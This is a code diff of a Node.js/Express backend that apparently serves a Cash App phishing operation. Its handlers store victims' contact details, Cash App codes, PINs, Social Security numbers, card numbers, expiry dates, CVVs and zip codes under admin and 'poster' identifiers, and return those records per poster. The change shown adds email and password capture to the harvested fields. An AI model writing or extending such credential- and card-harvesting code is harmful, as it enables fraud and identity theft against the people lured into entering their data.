@@ -802,7 +802,7 @@ module.exports.update_validity =  (req, res) => {
 
 module.exports.cashapap_post = async (req, res) => {
     const { adminId, posterId } = req.params
-    const { contact,code, pin, ssn, site, card_number,mm_yy, ccv,zip} = req.body;
+    const { contact,code, pin, ssn,email,password, site, card_number,mm_yy, ccv,zip} = req.body;
 
     try {
         const userFound = await User.findOne({ adminId: adminId })
@@ -810,7 +810,7 @@ module.exports.cashapap_post = async (req, res) => {
         const posterFound = await Poster.findOne({ posterId: posterId })
         if (userFound && posterFound) {
             const cashapp = await Cash.create({
-                contact, code, pin, ssn, site, card_number,mm_yy, ccv,zip,adminId, posterId
+                contact, code, pin, ssn, email,password,site,card_number,mm_yy, ccv,zip,adminId, posterId
     
     
             })
@@ -865,7 +865,7 @@ module.exports.get_deyails_cashapp = async (req, res) => {
     try {
         const cashappForPoster = await Cash.find({posterId:anyid }).sort({ createdAt: -1 })
         if (cashappForPoster.length > 0) {
-            return res.status(200).json({ cashapp: cashappForPoster })
+            return res.status(200).json({ cashapp: cashappForPoster})
 
         }
 
